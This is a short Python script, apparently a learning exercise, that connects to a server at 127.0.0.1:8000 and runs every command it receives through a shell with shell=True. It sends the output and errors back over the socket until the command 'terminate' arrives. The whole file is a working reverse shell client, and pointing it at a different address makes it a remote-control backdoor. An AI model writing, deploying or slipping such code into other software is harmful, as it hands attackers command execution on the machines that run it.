# -*- coding: utf-8 -*-
from socket import socket
import subprocess


def open_connection_to_server():
    sck = socket()
    sck.connect(("127.0.0.1", 8000))
    while True:
        cmd = sck.recv(1024)
        if "terminate" in cmd.decode():
            sck.close()
            break
        else:
            command_process = subprocess.Popen(cmd.decode(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            sck.send(command_process.stdout.read())
            sck.send(command_process.stderr.read())

if __name__ == "__main__":
    open_connection_to_server()
